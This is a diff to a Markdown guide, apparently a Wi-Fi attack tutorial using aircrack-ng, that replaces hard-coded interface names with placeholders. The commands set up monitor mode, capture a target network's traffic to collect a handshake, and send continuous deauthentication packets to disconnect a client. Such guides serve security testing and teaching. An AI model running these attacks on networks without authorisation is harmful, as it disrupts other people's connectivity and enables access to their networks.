@@ -71,7 +71,7 @@
 
 Please disregard the "<>"
 
-`aireplay-ng -9 -e teddy -a fe80::c18a:b505:4f0c:aae8 <name-your-device (wlan0,wlan1...) >`
+`aireplay-ng -9 -e teddy -a fe80::c18a:b505:4f0c:aae8 <name-your-device (wlan0,wlan1,wlp6s0 ...) >`
 
 ## If you don't know the name, open the terminal and type iwconfig in the terminal.
 
@@ -87,7 +87,7 @@ Handshake = Handshake is the process where two machines authenticate each other 
 
 Start aircrack:
 
-`airmon-ng start wlan0`
+`airmon-ng start <your-device>`
 
 `airmon-ng check kill`
 
@@ -95,31 +95,31 @@ Start aircrack:
 
 View all interfaces and networks:
 
-`airodump-ng wlan0mon`
+`airodump-ng <your-device-mon>`
 
 
 
 Focus on target network:
 
-`airodump-ng -c 4 --bssid <target ssid> -w capture wlp6s0 --ignore-negative-one`
+`airodump-ng -c 4 --bssid <target ssid> -w capture <your-device> --ignore-negative-one`
 
 
 
 Disconnect client:
 
-`aireplay-ng --deauth 0 -a <ap ssid> -c <client ssid to disconnect> wlp6s0 --ignore-negative-one`
+`aireplay-ng --deauth 0 -a <ap ssid> -c <client ssid to disconnect> <your-device> --ignore-negative-one`
 
 
 
 ## Stop monitor mode and restart wireless interface:
 
-`airmon-ng stop wlan0mon`
+`airmon-ng stop <your-device-mon>`
 
-`ifconfig wlan0 up`
+`ifconfig <your-device> up`
 
 `/etc/init.d/network-manager restart`
 
-`ip link set wlan0 up`
+`ip link set <your-device> up`
 
 
 
